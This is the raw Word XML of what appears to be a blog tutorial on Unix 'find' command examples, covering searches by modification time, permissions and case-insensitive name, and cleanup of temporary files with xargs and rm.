          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">In this example since we have only modified </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>StockTrading.java</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> some time back it has shown on find –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mtime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -1, rest of files are not touched today so they are appearing as modified more than 1 day while there is no file which has been modified exactly one day.</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08C95398"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lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>3. How to find all the files and directories which hold the 777 permission in UNIX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E98AEE2"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find –perm option is used to find files based upon permissions. You can use find –perm 444 to get all files which allow read permission to the owner, group, and others.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 xml:space="preserve">If you are not sure how those 777 and 444 numbers come up, see my post on </w:t>
      </w:r>
      <w:hyperlink r:id="rId41" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>file and directory permission in Unix</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and some </w:t>
      </w:r>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>chmod</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t xml:space="preserve"> examples</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to change permissions in Unix. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3279E493"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
    <w:p w14:paraId="0942B864"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javin</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testenv1:~</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java $ </w:t>
      </w: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-perm</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> 644</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>.</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>vimrc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>.</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OnlineStockTrading.java</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA897C3"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
    <w:p w14:paraId="61D2FFF6"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 xml:space="preserve">I use this </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find command example</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to find out all the executable files, you can also modify it to find all the read-only files or files having written permission etc by changing permissions e.g. to find all read-only files in current directory: </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find . –perm 555 </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Here </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"." or period</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> denotes the current directory. You can replace it with any directory you want.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Btw, if you are not familiar with file permissions then you should first check out </w:t>
      </w:r>
      <w:hyperlink r:id="rId43" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>Learn Linux in 5 Days and Level Up Your Career</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>, another great course for anyone who wants to work in Linux.  And, if you don't have time for course, the following diagram from none other than Julia Evans is again a great one to refresh your concepts about file permissions in Linux.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B25E53" w14:textId="10DC037A" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>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noProof/>
          <w:color w:val="0066CC"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="27D99A2C" wp14:editId="26EDEE4F">
            <wp:extent cx="5943600" cy="4495165"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:docPr id="29" name="Picture 29" descr="find command examples in Linux">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nd command examples in Linux">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p>
    <w:p w14:paraId="33D98DD0"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r>
    </w:p>
    <w:p w14:paraId="3C22418D"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lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>4. Case insensitive search using find in UNIX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093981A9"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 xml:space="preserve">How to do case insensitive search using find command in Unix? Use option </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>“-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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with name, by default find searches are case sensitive.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This option of the find is extremely helpful while looking for errors and exceptions in the log file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2FF626"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
    <w:p w14:paraId="11031422"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>iname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"error"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> –print </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>( -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is for ignore )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E280770"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 xml:space="preserve">On a different note find and grep command is also a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>favorite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> topic during </w:t>
      </w:r>
      <w:hyperlink r:id="rId45" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>UNIX Interviews</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and interview often asked questions during interviews on both system admin and application developer jobs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B2182D"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lastRenderedPageBreak/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B562A92" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>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t xml:space="preserve">UNIX find and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>xargs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command Example</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63AC1407"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 xml:space="preserve">Now we will see some UNIX find command example combined with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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command. A combination of </w:t>
      </w:r>
      <w:hyperlink r:id="rId46" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>find and </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
      </w:hyperlink>
      <w:hyperlink r:id="rId47" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>xargs</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> can be used to do whatever witch each file found by find command, for example, we can delete that file, list content of that file or can apply any comment on that file.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B894D72"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lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>5. How to delete temporary files using find command in UNIX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6D06C0"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 xml:space="preserve">In order to delete files, you can use either –delete option of find command or use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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in combination. It's better to create housekeeping script for such task which can perform </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>cleanup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> on a periodic basis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA8C2A7"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-name</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FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"*.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF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-print</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>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rm</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> –f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57403E68"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 xml:space="preserve">Use of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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along with find gives you immense power to do whatever you want with each search result.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 xml:space="preserve">See another example below, also its worth considering use of -print0 to avoid </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">problems with </w:t>
      </w:r>
      <w:hyperlink r:id="rId48" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>whitespace</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the path when piping to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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(use with the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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-0 option) as suggested by Ebon </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Elaza</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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56A70F65"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lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>6. How to find all text file which contains word Exception</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620679F2"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 xml:space="preserve">find . –name "*.java" –print | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
